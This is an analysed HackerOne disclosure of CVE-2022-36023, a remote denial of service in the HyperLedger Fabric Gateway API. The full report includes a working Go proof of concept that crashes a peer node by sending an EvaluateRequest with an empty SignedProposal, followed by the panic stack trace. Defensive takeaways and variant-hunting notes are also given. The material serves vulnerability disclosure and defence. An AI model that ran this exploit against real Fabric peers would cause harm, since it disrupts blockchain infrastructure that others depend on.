# Remote Denial of Service via Nil Pointer Dereference in HyperLedger Fabric Gateway API

## Metadata
- **Source:** HackerOne
- **Report:** 1635854 | https://hackerone.com/reports/1635854
- **Submitted:** 2022-07-13
- **Reporter:** zqgnd
- **Program:** HyperLedger Fabric
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Denial of Service, Nil Pointer Dereference, Input Validation Failure, Unhandled Exception
- **CVEs:** CVE-2022-36023
- **Category:** memory-binary

## Summary
A remote attacker can crash HyperLedger Fabric peer nodes by sending a malformed EvaluateRequest with an empty SignedProposal to the Gateway API endpoint. The crash occurs due to missing null pointer validation in the getChannelAndChaincodeFromSignedProposal function, resulting in a segmentation fault that terminates the peer process.

## Attack scenario
1. Attacker identifies a HyperLedger Fabric peer node running the Gateway API on a network-accessible port (typically 7051)
2. Attacker establishes a gRPC connection to the target peer using TLS credentials
3. Attacker crafts a minimal EvaluateRequest with an empty/nil SignedProposal payload
4. Attacker sends the malformed request to the Evaluate() RPC method
5. The gateway handler invokes getChannelAndChaincodeFromSignedProposal() without validating the SignedProposal is non-nil
6. The function attempts to dereference null pointer fields, causing a panic that crashes the peer process

## Root cause
The apiutils.go file fails to validate that ProposedTransaction (SignedProposal) is non-null before attempting to access its fields. The code assumes all incoming requests contain valid, fully-populated structures without implementing defensive null checks.

## Attacker mindset
An attacker seeks to disrupt blockchain network availability by triggering remote crashes on peer nodes. This requires minimal effort—a few lines of code can crash multiple peers simultaneously. The attack is trivial to automate and scale across a network, making it attractive for conducting infrastructure attacks against Fabric-based deployments.

## Defensive takeaways
- Implement comprehensive input validation on all RPC request handlers before processing payloads
- Add null/nil pointer checks at function entry points, especially for nested protocol buffer messages
- Use defensive programming patterns: validate required fields exist before dereferencing
- Implement structured logging and monitoring to detect repeated crash-inducing requests from single sources
- Add rate limiting or request validation middleware at the gRPC layer to reject obviously malformed requests early
- Create fuzz tests targeting RPC endpoints with minimal/empty payloads to catch similar issues
- Consider panic recovery middleware in gRPC interceptors to gracefully handle crashes instead of terminating peer processes

## Variant hunting
Similar nil pointer dereferences likely exist in other gateway API methods (Endorse, Submit, GetStatus). Any RPC handler that accepts protocol buffer messages without full validation is a candidate. Look for: (1) other methods in api.go that process SignedProposal or other complex objects, (2) functions that extract fields from request messages without null checks, (3) chaincode invocation paths that assume valid transaction structures.

## MITRE ATT&CK
- T1499
- T1499.4
- T1190

## Notes
The PoC demonstrates the crash is reproducible with minimal code—just creating an empty EvaluateRequest with an empty SignedProposal is sufficient. No authentication bypass is needed; the vulnerability exists in unauthenticated or authenticated request processing. The stack trace shows the crash occurs deep in middleware chains, suggesting crashes happen before any authorization checks. The vulnerability affects peer availability directly, making it a critical infrastructure threat for production Fabric networks.

## Full report
<details><summary>Expand</summary>

How to reproduce
1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)
2.Run the PoC.
```bash
go run poc.go -server=192.168.0.208:7051
```
```go
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"

	"github.com/hyperledger/fabric-protos-go/gateway"
	"github.com/hyperledger/fabric-protos-go/peer"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {

	var srv string
	flag.StringVar(&srv, "server", "localhost:7050", "The RPC server to connect to.")

	flag.Parse()

	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))
	
	defer func() {
		_ = conn.Close()
	}()

	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	payload := &gateway.EvaluateRequest{}


	payload.ProposedTransaction = &peer.SignedProposal{}



	resp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	fmt.Println("resp:", resp)

}

```
3.Crash.
```log
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]

goroutine 381927 [running]:
github.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7
github.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78
github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)
        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)
        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)
        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138
google.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f
google.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b
google.golang.org/grpc.(*Server).serveStreams.func1.2()
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98
created by google.golang.org/grpc.(*Server).serveStreams.func1
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a
```

## Impact

It can easily break down as many peers as the attacker wants.

</details>

---
*Analysed by Claude on 2026-05-24*
